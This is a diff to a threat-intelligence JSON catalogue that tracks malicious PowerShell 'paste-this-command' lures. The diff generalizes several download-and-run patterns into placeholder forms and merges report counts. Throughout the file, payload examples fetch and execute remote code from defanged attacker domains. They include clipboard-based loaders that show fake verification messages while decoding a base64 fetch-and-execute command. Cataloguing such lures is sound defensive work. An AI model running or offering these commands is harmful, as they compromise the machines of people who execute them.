@@ -636,6 +636,28 @@
     ]
   },
   {
+    "Pattern": "(irm '<URL>' -UserAgent 'WUA/<WUA_ID>' -Headers @{'X-WUA'='<WUA_ID>'})|iex",
+    "DistinctPayloadCount": 3,
+    "ReportCount": 8,
+    "FirstSeen": "2026-11-09T06:48:00.460000+00:00",
+    "LastSeen": "2026-11-13T00:38:57.467000+00:00",
+    "ReportIds": [
+      "cmw8wg9f727m90omlhf499nfm",
+      "cmw8xxtdc2aab0omlcf7pf3sg",
+      "cmw9n6mj101wv0oml32xyr1jx",
+      "cmwb9h38w036h0nmld2sxsius",
+      "cmwba4rrn03zm0nmlk0p8nr3q",
+      "cmwc8h8ly05p60omloemc6t0j",
+      "cmwd9bnf802hk0omlsqvlimv7",
+      "cmwe912g309r10oml56qzo8en"
+    ],
+    "PayloadExamples": [
+      "(irm 'https://cosmical2049[.]com/lom3/0ad7a0bdad0aa13d' -UserAgent 'WUA/adedf1881f' -Headers @{'X-WUA'='adedf1881f'})|iex",
+      "(irm 'https://cosmical2049[.]com/startapv2/f9b9bfb54f8b30ec' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex",
+      "(irm 'https://gfisoda[.]biz/clickfix/8e15947cbef29c2d' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex"
+    ]
+  },
+  {
     "Pattern": "powershell -c \\\"irm '<URL>'|powershell -\\\"",
     "DistinctPayloadCount": 2,
     "ReportCount": 3,
@@ -649,6 +671,21 @@
     "PayloadExamples": [
       "powershell -c \\\"irm 'https://content-collector[.]com/4MRhuy1FNnrumSHZ'|powershell -\\\"",
       "powershell -c \\\"irm 'https://content-collector[.]com/6snqpNaX8nyGX0an'|powershell -\\\""
+    ]
+  },
+  {
+    "Pattern": "powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 1)] -join \"\"\"\"`n\"\"\"\");\"\" echo \"<BANNER>\"` Write-Output \"Initializing verification ...\" Start-Sleep -Milliseconds <MILLISECONDS> $updateloadUrl = '<BASE64>' $bytes = [Convert]::FromBase64String($updateloadUrl) $clean = [Text.Encoding]::Unicode.GetString($bytes) Start-Sleep -Milliseconds <MILLISECONDS> Write-Output \"Processing request ...\" Start-Sleep -Milliseconds <MILLISECONDS> Write-Host -NoNewline \"Verification successful. Continuing. Please wait a few seconds and do not close this window \" for ($i = 0; $i -lt 5; $i++) { Start-Sleep -Milliseconds <MILLISECONDS> Write-Host -NoNewline \".\" } Invoke-Expression $clean",
+    "DistinctPayloadCount": 2,
+    "ReportCount": 2,
+    "FirstSeen": "2026-11-12T01:50:44.091000+00:00",
+    "LastSeen": "2026-11-12T17:44:10.365000+00:00",
+    "ReportIds": [
+      "cmwcw5ism0f650omlpzn2v666",
+      "cmwdu7ne704wl0oml3qv8u2ba"
+    ],
+    "PayloadExamples": [
+      "powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 1)] -join \"\"\"\"`n\"\"\"\");\"\"                                                                                                                                                              \necho \"\n  ____ _                 _  __ _\n / ___| | ___  _   _  __| |/ _| | __ _ _ __ ___\n| |   | |/ _ \\| | | |/ _  | |_| |/ _  |  __/ _ \\\n| |___| | (_) | |_| | (_| |  _| | (_| | | |  __/\n \\____|_|\\___/ \\__,_|\\__,_|_| |_|\\__,_|_|  \\___|\n\"`\n\nWrite-Output \"Initializing verification ...\"\nStart-Sleep -Milliseconds 541\n\n$updateloadUrl = 'UwBlAHQALQBBAGwAaQBhAHMAIAB2AGIAbAAgACgAZwBjAG0AIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AKQA7ACQAYwBhAGsAeQB2AG8APQAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBhAG0AZQByAGkAYwBhAG4AYgBvAHkAdwBvAHcALwBtAGEAcgB5AHMAdAB1AGEAcgB0AFUAUwAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbwBsAGQALQB1AHAAZABhAHQAZQAuAGQAYQB0ACcAKQA7AHYAYgBsACgAaQB3AHIAIAAtAHUAcwBlAGIAYQBzACAAJABjAGEAawB5AHYAbwApAA=='\n\n$bytes = [Convert]::FromBase64String($updateloadUrl)\n$clean = [Text.Encoding]::Unicode.GetString($bytes)\n\nStart-Sleep -Milliseconds 581\nWrite-Output \"Processing request ...\"\nStart-Sleep -Milliseconds 943\nWrite-Host -NoNewline \"Verification successful. Continuing. Please wait a few seconds and do not close this window \"\nfor ($i = 0; $i -lt 5; $i++) {\n    Start-Sleep -Milliseconds 400\n    Write-Host -NoNewline \".\"\n}\nInvoke-Expression $clean",
+      "powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 1)] -join \"\"\"\"`n\"\"\"\");\"\"                                                                                                                                                              \necho \"\n  ______ _                 _  ___ _                  \n / _____) |               | |/ __) |                 \n| /     | | ___  _   _  _ | | |__| | ____  ____ ____ \n| |     | |/ _ \\| | | |/ || |  __) |/ _  |/ ___) _  )\n| \\_____| | |_| | |_| ( (_| | |  | ( ( | | |  ( (/ / \n \\______)_|\\___/ \\____|\\____|_|  |_|\\_||_|_|   \\____)\n\"`\n\nWrite-Output \"Initializing verification ...\"\nStart-Sleep -Milliseconds 573\n\n$updateloadUrl = 'cwBhAGwAIABrAHIAaAAgACgAIABnAGMAbQAgACoALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKQAgADsAawByAGgAKAAgAGMAdQByAGwAIAAtAHUAcwBlAGIAYQBzACAAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGEAbQBlAHIAaQBjAGEAbgBiAG8AeQB3AG8AdwAvAG0AYQByAHkAcwB0AHUAYQByAHQAVQBTAC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBvAGwAZAAtAHUAcABkAGEAdABlAC4AZABhAHQAJwAgACkA'\n\n$bytes = [Convert]::FromBase64String($updateloadUrl)\n$clean = [Text.Encoding]::Unicode.GetString($bytes)\n\nStart-Sleep -Milliseconds 513\nWrite-Output \"Processing request ...\"\nStart-Sleep -Milliseconds 1102\nWrite-Host -NoNewline \"Verification successful. Continuing. Please wait a few seconds and do not close this window \"\nfor ($i = 0; $i -lt 5; $i++) {\n    Start-Sleep -Milliseconds 400\n    Write-Host -NoNewline \".\"\n}\nInvoke-Expression $clean"
     ]
   },
   {
@@ -796,50 +833,6 @@
     ]
   },
   {
-    "Pattern": "(irm '<URL>' -UserAgent 'WUA/adedf1881f' -Headers @{'X-WUA'='adedf1881f'})|iex",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 3,
-    "FirstSeen": "2026-11-09T19:16:20.516000+00:00",
-    "LastSeen": "2026-11-11T14:47:59.979000+00:00",
-    "ReportIds": [
-      "cmw9n6mj101wv0oml32xyr1jx",
-      "cmwba4rrn03zm0nmlk0p8nr3q",
-      "cmwc8h8ly05p60omloemc6t0j"
-    ],
-    "PayloadExamples": [
-      "(irm 'https://cosmical2049[.]com/lom3/0ad7a0bdad0aa13d' -UserAgent 'WUA/adedf1881f' -Headers @{'X-WUA'='adedf1881f'})|iex"
-    ]
-  },
-  {
-    "Pattern": "(irm '<URL>' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 3,
-    "FirstSeen": "2026-11-09T06:48:00.460000+00:00",
-    "LastSeen": "2026-11-12T07:59:24.865000+00:00",
-    "ReportIds": [
-      "cmw8wg9f727m90omlhf499nfm",
-      "cmw8xxtdc2aab0omlcf7pf3sg",
-      "cmwd9bnf802hk0omlsqvlimv7"
-    ],
-    "PayloadExamples": [
-      "(irm 'https://cosmical2049[.]com/startapv2/f9b9bfb54f8b30ec' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex"
-    ]
-  },
-  {
-    "Pattern": "(irm '<URL>' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 2,
-    "FirstSeen": "2026-11-10T22:28:06.498000+00:00",
-    "LastSeen": "2026-11-13T00:38:57.467000+00:00",
-    "ReportIds": [
-      "cmwb9h38w036h0nmld2sxsius",
-      "cmwe912g309r10oml56qzo8en"
-    ],
-    "PayloadExamples": [
-      "(irm 'https://gfisoda[.]biz/clickfix/8e15947cbef29c2d' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex"
-    ]
-  },
-  {
     "Pattern": "cmd /c start /min cmd /c \"curl -sko %tmp%\\\\~u.cmd https://' + SCRIPTS_DOMAIN + '/u/stage1.cmd&%tmp%\\\\~u.cmd\"",
     "DistinctPayloadCount": 1,
     "ReportCount": 2,
@@ -854,7 +847,7 @@
     ]
   },
   {
-    "Pattern": "iex(irm '<URL>' -UserAgent 'WUA/8382bc918d' -Headers @{'X-WUA'='8382bc918d'})",
+    "Pattern": "iex(irm '<URL>' -UserAgent 'WUA/<WUA_ID>' -Headers @{'X-WUA'='<WUA_ID>'})",
     "DistinctPayloadCount": 1,
     "ReportCount": 2,
     "FirstSeen": "2026-11-09T20:44:40.970000+00:00",
@@ -995,32 +988,6 @@
     ],
     "PayloadExamples": [
       "irm 'https://err12[.]online/MPN34CUssTOxul1S=9aa1f611e4d27fce' | iex;"
-    ]
-  },
-  {
-    "Pattern": "powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 1)] -join \"\"\"\"`n\"\"\"\");\"\"                                                                                                                                                              \necho \"\n  ____ _                 _  __ _\n / ___| | ___  _   _  __| |/ _| | __ _ _ __ ___\n| |   | |/ _ \\| | | |/ _  | |_| |/ _  |  __/ _ \\\n| |___| | (_) | |_| | (_| |  _| | (_| | | |  __/\n \\____|_|\\___/ \\__,_|\\__,_|_| |_|\\__,_|_|  \\___|\n\"`\n\nWrite-Output \"Initializing verification ...\"\nStart-Sleep -Milliseconds 541\n\n$updateloadUrl = 'UwBlAHQALQBBAGwAaQBhAHMAIAB2AGIAbAAgACgAZwBjAG0AIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AKQA7ACQAYwBhAGsAeQB2AG8APQAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBhAG0AZQByAGkAYwBhAG4AYgBvAHkAdwBvAHcALwBtAGEAcgB5AHMAdAB1AGEAcgB0AFUAUwAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbwBsAGQALQB1AHAAZABhAHQAZQAuAGQAYQB0ACcAKQA7AHYAYgBsACgAaQB3AHIAIAAtAHUAcwBlAGIAYQBzACAAJABjAGEAawB5AHYAbwApAA=='\n\n$bytes = [Convert]::FromBase64String($updateloadUrl)\n$clean = [Text.Encoding]::Unicode.GetString($bytes)\n\nStart-Sleep -Milliseconds 581\nWrite-Output \"Processing request ...\"\nStart-Sleep -Milliseconds 943\nWrite-Host -NoNewline \"Verification successful. Continuing. Please wait a few seconds and do not close this window \"\nfor ($i = 0; $i -lt 5; $i++) {\n    Start-Sleep -Milliseconds 400\n    Write-Host -NoNewline \".\"\n}\nInvoke-Expression $clean",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-12T01:50:44.091000+00:00",
-    "LastSeen": "2026-11-12T01:50:44.091000+00:00",
-    "ReportIds": [
-      "cmwcw5ism0f650omlpzn2v666"
-    ],
-    "PayloadExamples": [
-      "powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 1)] -join \"\"\"\"`n\"\"\"\");\"\"                                                                                                                                                              \necho \"\n  ____ _                 _  __ _\n / ___| | ___  _   _  __| |/ _| | __ _ _ __ ___\n| |   | |/ _ \\| | | |/ _  | |_| |/ _  |  __/ _ \\\n| |___| | (_) | |_| | (_| |  _| | (_| | | |  __/\n \\____|_|\\___/ \\__,_|\\__,_|_| |_|\\__,_|_|  \\___|\n\"`\n\nWrite-Output \"Initializing verification ...\"\nStart-Sleep -Milliseconds 541\n\n$updateloadUrl = 'UwBlAHQALQBBAGwAaQBhAHMAIAB2AGIAbAAgACgAZwBjAG0AIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AKQA7ACQAYwBhAGsAeQB2AG8APQAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBhAG0AZQByAGkAYwBhAG4AYgBvAHkAdwBvAHcALwBtAGEAcgB5AHMAdAB1AGEAcgB0AFUAUwAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbwBsAGQALQB1AHAAZABhAHQAZQAuAGQAYQB0ACcAKQA7AHYAYgBsACgAaQB3AHIAIAAtAHUAcwBlAGIAYQBzACAAJABjAGEAawB5AHYAbwApAA=='\n\n$bytes = [Convert]::FromBase64String($updateloadUrl)\n$clean = [Text.Encoding]::Unicode.GetString($bytes)\n\nStart-Sleep -Milliseconds 581\nWrite-Output \"Processing request ...\"\nStart-Sleep -Milliseconds 943\nWrite-Host -NoNewline \"Verification successful. Continuing. Please wait a few seconds and do not close this window \"\nfor ($i = 0; $i -lt 5; $i++) {\n    Start-Sleep -Milliseconds 400\n    Write-Host -NoNewline \".\"\n}\nInvoke-Expression $clean"
-    ]
-  },
-  {
-    "Pattern": "powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 1)] -join \"\"\"\"`n\"\"\"\");\"\"                                                                                                                                                              \necho \"\n  ______ _                 _  ___ _                  \n / _____) |               | |/ __) |                 \n| /     | | ___  _   _  _ | | |__| | ____  ____ ____ \n| |     | |/ _ \\| | | |/ || |  __) |/ _  |/ ___) _  )\n| \\_____| | |_| | |_| ( (_| | |  | ( ( | | |  ( (/ / \n \\______)_|\\___/ \\____|\\____|_|  |_|\\_||_|_|   \\____)\n\"`\n\nWrite-Output \"Initializing verification ...\"\nStart-Sleep -Milliseconds 573\n\n$updateloadUrl = 'cwBhAGwAIABrAHIAaAAgACgAIABnAGMAbQAgACoALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKQAgADsAawByAGgAKAAgAGMAdQByAGwAIAAtAHUAcwBlAGIAYQBzACAAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGEAbQBlAHIAaQBjAGEAbgBiAG8AeQB3AG8AdwAvAG0AYQByAHkAcwB0AHUAYQByAHQAVQBTAC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBvAGwAZAAtAHUAcABkAGEAdABlAC4AZABhAHQAJwAgACkA'\n\n$bytes = [Convert]::FromBase64String($updateloadUrl)\n$clean = [Text.Encoding]::Unicode.GetString($bytes)\n\nStart-Sleep -Milliseconds 513\nWrite-Output \"Processing request ...\"\nStart-Sleep -Milliseconds 1102\nWrite-Host -NoNewline \"Verification successful. Continuing. Please wait a few seconds and do not close this window \"\nfor ($i = 0; $i -lt 5; $i++) {\n    Start-Sleep -Milliseconds 400\n    Write-Host -NoNewline \".\"\n}\nInvoke-Expression $clean",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-12T17:44:10.365000+00:00",
-    "LastSeen": "2026-11-12T17:44:10.365000+00:00",
-    "ReportIds": [
-      "cmwdu7ne704wl0oml3qv8u2ba"
-    ],
-    "PayloadExamples": [
-      "powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 1)] -join \"\"\"\"`n\"\"\"\");\"\"                                                                                                                                                              \necho \"\n  ______ _                 _  ___ _                  \n / _____) |               | |/ __) |                 \n| /     | | ___  _   _  _ | | |__| | ____  ____ ____ \n| |     | |/ _ \\| | | |/ || |  __) |/ _  |/ ___) _  )\n| \\_____| | |_| | |_| ( (_| | |  | ( ( | | |  ( (/ / \n \\______)_|\\___/ \\____|\\____|_|  |_|\\_||_|_|   \\____)\n\"`\n\nWrite-Output \"Initializing verification ...\"\nStart-Sleep -Milliseconds 573\n\n$updateloadUrl = 'cwBhAGwAIABrAHIAaAAgACgAIABnAGMAbQAgACoALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKQAgADsAawByAGgAKAAgAGMAdQByAGwAIAAtAHUAcwBlAGIAYQBzACAAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGEAbQBlAHIAaQBjAGEAbgBiAG8AeQB3AG8AdwAvAG0AYQByAHkAcwB0AHUAYQByAHQAVQBTAC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBvAGwAZAAtAHUAcABkAGEAdABlAC4AZABhAHQAJwAgACkA'\n\n$bytes = [Convert]::FromBase64String($updateloadUrl)\n$clean = [Text.Encoding]::Unicode.GetString($bytes)\n\nStart-Sleep -Milliseconds 513\nWrite-Output \"Processing request ...\"\nStart-Sleep -Milliseconds 1102\nWrite-Host -NoNewline \"Verification successful. Continuing. Please wait a few seconds and do not close this window \"\nfor ($i = 0; $i -lt 5; $i++) {\n    Start-Sleep -Milliseconds 400\n    Write-Host -NoNewline \".\"\n}\nInvoke-Expression $clean"
     ]
   },
   {
